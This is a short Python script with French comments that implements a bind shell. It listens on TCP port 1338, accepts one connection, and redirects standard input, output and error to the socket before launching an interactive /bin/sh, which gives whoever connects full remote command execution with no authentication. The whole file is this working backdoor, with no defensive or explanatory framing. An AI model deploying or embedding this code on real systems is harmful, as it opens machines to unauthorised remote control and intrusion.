# --*-- coding:UTF-8 --*--

import os
import socket
import subprocess

host = ''  # IP de l'ordinateur localhost si vide
port = 1338  # Port d'écoute
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creation du socket en IPv4 et TCP

try:  # Reservation du port ci-dessus
    s.bind((host, port))
    print("Server started\n")
except socket.error as exeption:
    print(exeption)
    exit(0)

s.listen(1)  # Attente 1 connection
client, adresse = s.accept()  # Acceptatin de la connection
print(adresse)  # Affichage de l'addresse du client
welcomeMessage = "Bonjour\n"
client.send(bytes(welcomeMessage, encoding='utf8'))  # Envoie du message de bienvenue

for f in range(3):  # Redirection des entrées sorties stdin, stdout, stderr
    os.dup2(client.fileno(), f)

p = subprocess.call(["/bin/sh", "-i"])  # Ouverture du shell sh en mode interractif

s.close()  # Fermeture du socket après avoir quitter le shell
